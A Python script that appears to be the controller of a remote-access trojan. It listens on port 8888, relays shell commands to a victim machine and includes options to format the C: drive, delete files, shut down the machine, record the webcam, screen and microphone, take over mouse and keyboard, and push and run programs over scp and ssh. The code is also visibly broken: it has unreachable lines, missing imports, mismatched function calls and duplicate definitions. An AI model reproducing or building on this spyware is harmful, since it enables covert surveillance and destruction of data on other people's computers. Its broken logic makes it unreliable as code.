import socket
import os
import subprocess
import cv2
import numpy as np
import pyautogui
import pyaudio
import io
from PIL import ImageGrab
import platform
import threading
import time
import pyglet
import win32ui
import win32clipboard
import ctypes

HOST = '192.168.1.10'
target_ip = '192.168.1.10'
port = 8888
PORT = 8888

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', 8888))
    s.listen(1)
    print('[*] Listening on port 8888...')
    conn, addr = s.accept()
    print(f'[*] Connection established from: {addr[0]}:{addr[1]}')
    while True:
        command = input('Shell> ')
        conn.send(command.encode())
        output = conn.recv(1024).decode()
        print(output)
        if 'exit' in command.lower():
            conn.send('exit'.encode())
            conn.close()
            break
            conn.send(command.encode()) # Send the command to the target machine
            output = conn.recv(1024).decode() # Receive the output from the target machine
            print(output)
        if command.lower() == "format":
            output = subprocess.getoutput("format C:\\")
            conn.send(command.encode()) # Send the command to the target machine
            output = conn.recv(1024).decode() # Receive the output from the target machine
            print(output)
        if "delete " in command.lower():
            filename = command.lower().replace("delete ", "")
            try:
                os.remove(filename)
                output = f"{filename} deleted successfully."
            except FileNotFoundError:
                output = f"File {filename} not found."
            except PermissionError:
                output = f"You don't have permission to delete {filename}."
            conn.send(command.encode()) # Send the command to the target machine
            output = conn.recv(1024).decode() # Receive the output from the target machine
            print(output)
        if command.lower() == 'cam':
                # start the video stream
            cap = cv2.VideoCapture(0)

                # set the size of the image frames
            cap.set(3, 640)
            cap.set(4, 480)

                # define the codec and create VideoWriter object
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter('output.avi', fourcc, 20.0, (640, 480))

            while True:
                    # grab a frame from the video stream
                    ret, frame = cap.read()

                    # write the frame to the output video file
                    out.write(frame)

                    # display the frame
                    cv2.imshow('frame', frame)

                    # break if the 'q' key is pressed
                    if cv2.waitKey(1) & 0xFF == ord('q'):
                        break

	    # release resources and close windows
            cap.release()
            out.release()
            cv2.destroyAllWindows()

	    # send the output video file to the attacker's computer
            with open('output.avi', 'rb') as f:
                    s.sendall(f.read())

            conn.send(command.encode()) # Send the command to the target machine
            output = conn.recv(1024).decode() # Receive the output from the target machine
            print(output)

        if command.lower() == "shutdown":
            output = subprocess.getoutput("shutdown /s /t 1")
            conn.send(command.encode()) # Send the command to the target machine
            output = conn.recv(1024).decode() # Receive the output from the target machine
            print(output)
        if command.lower() == "restart":
            output = subprocess.getoutput("shutdown /r /t 1")
            conn.send(command.encode()) # Send the command to the target machine
            output = conn.recv(1024).decode() # Receive the output from the target machine
            print(output)
        if command.lower().startswith("passprogram"):
            program_path = command[12:]
            subprocess.call(['scp', program_path, f'user@{target_ip}:'])
            output = f"{program_path} successfully passed to target device."
            conn.send(command.encode()) # Send the command to the target machine
            output = conn.recv(1024).decode() # Receive the output from the target machine
            print(output)
        if command.lower().startswith('execute'):
            # Extract the program path from the command
            program_path = command.split(' ', 1)[1]

            # Pass the program to the target machine
            subprocess.call(['scp', program_path, f'user@{target_ip}:'])

            # Execute the program on the target machine
            execute_command = f'ssh user@{target_ip} {program_path}'
            output = subprocess.getoutput(execute_command)

            # Send the output of the program execution to the attacker
            s.sendall(output.encode())

        # Otherwise, send the command to the target machine for execution
        else:
            s.sendall(command.encode())
            conn.send(command.encode()) # Send the command to the target machine
            output = conn.recv(1024).decode() # Receive the output from the target machine
            print(output)

        if command.lower() == 'spy':
            # capture a screenshot from the victim's machine
            img = np.array(ImageGrab.grab())

            # convert the image to a byte string
            data = img.tobytes()

            # send the image to the attacker
            s.sendall(data)
            conn.send(command.encode()) # Send the command to the target machine
            output = conn.recv(1024).decode('latin-1')
 # Receive the output from the target machine
            print(output)
        if command.lower() == 'control':
            VK_CODE = {'left_button': 0x01,
                       'right_button': 0x02,
                       'cancel': 0x03,
                       'middle_button': 0x04,
                       'backspace': 0x08,
                       'tab': 0x09,
                       'clear': 0x0C,
                       'enter': 0x0D,
                       'shift': 0x10,
                       'ctrl': 0x11,
                       'alt': 0x12,
                       'pause': 0x13,
                       'caps_lock': 0x14,
                       'esc': 0x1B,
                       'spacebar': 0x20,
                       'page_up': 0x21,
                       'page_down': 0x22,
                       'end': 0x23,
                       'home': 0x24,
                       'left_arrow': 0x25,
                       'up_arrow': 0x26,
                       'right_arrow': 0x27,
                       'down_arrow': 0x28,
                       'print_screen': 0x2C,
                       'insert': 0x2D,
                       'delete': 0x2E,
                       '0': 0x30,
                       '1': 0x31,
                       '2': 0x32,
                       '3': 0x33,
                       '4': 0x34,
                       '5': 0x35,
                       '6': 0x36,
                       '7': 0x37,
                       '8': 0x38,
                       '9': 0x39,
                       'a': 0x41,
                       'b': 0x42,
                       'c': 0x43,
                       'd': 0x44,
                       'e': 0x45,
                       'f': 0x46,
                       'g': 0x47,
                       'h': 0x48,
                       'i': 0x49,
                       'j': 0x4A,
                       'k': 0x4B,
                       'l': 0x4C,
                       'm': 0x4D,
                       'n': 0x4E,
                       'o': 0x4F,
                       'p': 0x50,
                       'q': 0x51,
                       'r': 0x52,
                       's': 0x53,
                       't': 0x54,
                       'u': 0x55,
                       'v': 0x56,
                       'w': 0x57,
                       'x': 0x58,
                       'y': 0x59,
                       'z': 0x5A,
                       'numpad_0': 0x60,
                       'numpad_1': 0x61,
                       'numpad_2': 0x62,
                       'numpad_3': 0x63,
                       'numpad_4': 0x64,
                       'numpad_5': 0x65,
                       'numpad_6': 0x66,
                       'numpad_7': 0x67,
                       'numpad_8': 0x68,
                       'numpad_9': 0x69,
                       'multiply_key': 0x6A,
                       'add_key': 0x6B,
                       'separator_key': 0x6C,
                       'subtract_key': 0x6D,
                       'decimal_point': 0x6E,
                       'divide_key': 0x6F,
                       'F1': 0x70,
                       'F2': 0x71,
                       'F3': 0x72,
                       'F4': 0x73,
                       'F5': 0x74,
                       'F6': 0x75,
                       'F7': 0x76,
                       'F8': 0x77,
                       'F9': 0x78,
                       'F10': 0x79,
                       'F11': 0x7A,
                       'F12': 0x7B,
                       'num_lock': 0x90,
                       'scroll_lock': 0x91,
                       'left_shift': 0xA0,
                       'right_shift ': 0xA1,
                       'left_control': 0xA2,
                       'right_control': 0xA3,
                       'left_menu': 0xA4,
                       'right_menu': 0xA5,
                       'browser_back': 0xA6,
                       'browser_forward': 0xA7,
                       'browser_refresh': 0xA8,
                       'browser_stop': 0xA9,
                       'browser_search': 0xAA,
                       'browser_favorites': 0xAB,
                       'browser_start_and_home': 0xAC,
                       'volume_mute': 0xAD,
                       'volume_Down': 0xAE,
                       'volume_up': 0xAF,
                       'next_track': 0xB0,
                       'previous_track': 0xB1,
                       'stop_media': 0xB2,
                       'play/pause_media': 0xB3,
                       'start_mail': 0xB4,
                       'select_media': 0xB5,
                       'start_application_1': 0xB6,
                       'start_application_2': 0xB7,
                       ';': 0xBA,
                       '=': 0xBB,
                       ',': 0xBC,
                       '-': 0xBD,
                       '.': 0xBE,
                       '/': 0xBF,
                       '`': 0xC0,
                       '[': 0xDB,
                       '\\': 0xDC,
                       ']': 0xDD,
                       "'": 0xDE}    
                        # Start capturing mouse and keyboard events
                        # Create a socket object and bind it to a port
            def send_key_event():
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.bind((HOST, PORT))
                    s.listen()
                    conn, addr = s.accept()
                    with conn:
                        print('Connected by', addr)

                        # Loop to receive and process commands from the attacker
                        while True:
                            data = conn.recv(1024)  # receive data from the attacker
                            if not data:
                                break
            
                            # Process the command received from the attacker
                            command = data.decode()
                            if command == 'hello':
                                conn.sendall('Hello, World!'.encode())  # send a response to the attacker
                            elif command == 'quit':
                                break

                print('Server closed.')
            def calculate_target_coordinates(x, y, target_handle):
                """
                Calculates the target coordinates based on the specified window handle and the x, y coordinates relative to the
                target window.
                """
                # Get the client area of the target window
                left, top, right, bottom = win32gui.GetClientRect(target_handle)

                # Get the position of the target window on the screen
                window_left, window_top, _, _ = win32gui.GetWindowRect(target_handle)

                # Calculate the target coordinates
                target_x = window_left + left + x
                target_y = window_top + top + y

                return target_x, target_y


            def send_mouse_event(event_name, x, y):
                """
                Sends a mouse event with the specified name (e.g. 'left_button_down') and coordinates.
                """
                # Calculate the input type based on the event name
                input_type = win32con.INPUT_MOUSE
                if 'wheel' in event_name:
                    input_type = win32con.INPUT_MOUSE

                # Set the appropriate flags based on the event name
                flags = win32con.MOUSEEVENTF_ABSOLUTE
                if 'down' in event_name:
                    flags |= win32con.MOUSEEVENTF_LEFTDOWN
                if 'up' in event_name:
                    flags |= win32con.MOUSEEVENTF_LEFTUP
                if 'right' in event_name:
                    flags |= win32con.MOUSEEVENTF_RIGHTDOWN
                if 'left' in event_name:
                    flags |= win32con.MOUSEEVENTF_LEFTDOWN
                if 'wheel' in event_name:
                    flags |= win32con.MOUSEEVENTF_WHEEL

                # Create the input object
                input_object = win32api.MOUSEINPUT(x, y, 0, flags, 0, None)

                # Send the input event
                win32api.SendInput(1, [input_object], ctypes.sizeof(win32api.INPUT))

            def calculate_target_coordinates(x, y):
                # Get the current screen resolution
                screen_width, screen_height = win32api.GetSystemMetrics(0), win32api.GetSystemMetrics(1)

                # Calculate the target coordinates
                target_x = int(x * (65535.0 / screen_width) + 1)
                target_y = int(y * (65535.0 / screen_height) + 1)

                return target_x, target_y

            def set_modifiers(modifiers):
                """
                Set the specified keyboard modifiers.

                Args:
                    modifiers (list of str): A list of modifier keys to set, e.g. ['ctrl', 'alt'].
                """
                # Initialize modifier key flags
                key_flags = 0

                # Set modifier key flags based on input list
                for mod in modifiers:
                    if mod == 'ctrl':
                        key_flags |= win32con.MOD_CONTROL
                    elif mod == 'alt':
                        key_flags |= win32con.MOD_ALT
                    elif mod == 'shift':
                        key_flags |= win32con.MOD_SHIFT
                    elif mod == 'win':
                        key_flags |= win32con.MOD_WIN

                # Set the keyboard state with the modifier keys
                win32api.keybd_event(win32con.VK_MENU, 0, key_flags, 0)
                win32api.keybd_event(win32con.VK_CONTROL, 0, key_flags, 0)
                win32api.keybd_event(win32con.VK_SHIFT, 0, key_flags, 0)
                win32api.keybd_event(win32con.VK_LWIN, 0, key_flags, 0)

            def on_mouse_press(x, y, button, modifiers):
                # Calculate the target coordinates
                target_x, target_y = calculate_target_coordinates(x, y)

                # Send mouse press event to target window
                send_mouse_event(target_x, target_y, button, win32con.WM_LBUTTONDOWN)

            def on_mouse_release(x, y, button, modifiers):
                # Calculate the target coordinates
                target_x, target_y = calculate_target_coordinates(x, y)

                # Send mouse release event to target window
                send_mouse_event(target_x, target_y, button, win32con.WM_LBUTTONUP)

            def on_mouse_drag(x, y, dx, dy, buttons, modifiers):
                # Calculate the target coordinates
                target_x, target_y = calculate_target_coordinates(x, y)

                # Send mouse drag event to target window
                send_mouse_event(target_x, target_y, buttons, win32con.WM_MOUSEMOVE)

            def on_key_press(symbol, modifiers):
                # Get the virtual key code for the symbol
                vk_code = VK_CODE.get(symbol)

                # If the symbol is not in VK_CODE, return
                if vk_code is None:
                    return

                # If the symbol is a modifier key, set the corresponding flag
                if symbol == pyglet.window.key.LCTRL:
                    set_modifiers(win32con.MOD_CONTROL, win32con.KEYEVENTF_EXTENDEDKEY)
                elif symbol == pyglet.window.key.LSHIFT:
                    set_modifiers(win32con.MOD_SHIFT, win32con.KEYEVENTF_EXTENDEDKEY)
                elif symbol == pyglet.window.key.LALT:
                    set_modifiers(win32con.MOD_ALT, win32con.KEYEVENTF_EXTENDEDKEY)
                elif symbol == pyglet.window.key.RCTRL:
                    set_modifiers(win32con.MOD_CONTROL, win32con.KEYEVENTF_EXTENDEDKEY | win32con.KEYEVENTF_KEYUP)
                elif symbol == pyglet.window.key.RSHIFT:
                    set_modifiers(win32con.MOD_SHIFT, win32con.KEYEVENTF_EXTENDEDKEY | win32con.KEYEVENTF_KEYUP)
                elif symbol == pyglet.window.key.RALT:
                    set_modifiers(win32con.MOD_ALT, win32con.KEYEVENTF_EXTENDEDKEY | win32con.KEYEVENTF_KEYUP)

                # Send key press event to target window
                send_key_event(vk_code, 0)

            def on_key_release(symbol, modifiers):
                # Get the virtual key code for the symbol
                vk_code = VK_CODE.get(symbol)

                # If the symbol is not in VK_CODE, return
                if vk_code is None:
                    return

                # If the symbol is a modifier key, unset the corresponding flag
                if symbol == pyglet.window.key.LCTRL:
                    set_modifiers(win32con.MOD_CONTROL, win32con.KEYEVENTF_EXTENDEDKEY | win32con.KEYEVENTF_KEYUP)
                elif symbol == pyglet.window.key.LSHIFT:
                    set_modifiers(win32con.MOD_SHIFT, win32con.KEYEVENTF_EXTENDEDKEY | win32con.KEYEVENTF_KEYUP)
                elif symbol == pyglet.window.key.LALT:
                    set_modifiers(win32con.MOD_ALT, win32con.KEYEVENTF_EXTENDEDKEY | win32con.KEYEVENTF_KEYUP)

                # Send key release event to target window
                send_key_event(vk_code, win32con.KEYEVENTF_KEYUP)

            # Create the pyglet window
            window = pyglet.window.Window()

            # Register event handlers
                # Add event handlers to the window
            window.push_handlers(on_mouse_press, on_mouse_release, on_mouse_drag, on_key_press, on_key_release)

            # Start the event loop
            pyglet.app.run()


            conn.send(command.encode()) # Send the command to the target machine
            output = conn.recv(1024).decode() # Receive the output from the target machine
            print(output)

        if command.lower() == 'mic':
            # Initialize PyAudio
            audio = pyaudio.PyAudio()

            # Define callback function to record audio
            def callback(in_data, frame_count, time_info, status):
                # Do whatever you want with the audio data here
                return (None, pyaudio.paContinue)

            # Open microphone stream
            stream = audio.open(format=pyaudio.paInt16,
                                 channels=1,
                                 rate=44100,
                                 input=True,
                                 frames_per_buffer=1024,
                                 stream_callback=callback)

            # Start the stream
            stream.start_stream()

            # Keep the stream running for 10 seconds
            time.sleep(10)

            # Stop the stream and terminate PyAudio
            stream.stop_stream()
            stream.close()
            audio.terminate()
            conn.send(command.encode()) # Send the command to the target machine
            output = conn.recv(1024).decode() # Receive the output from the target machine
            print(output)
connect()
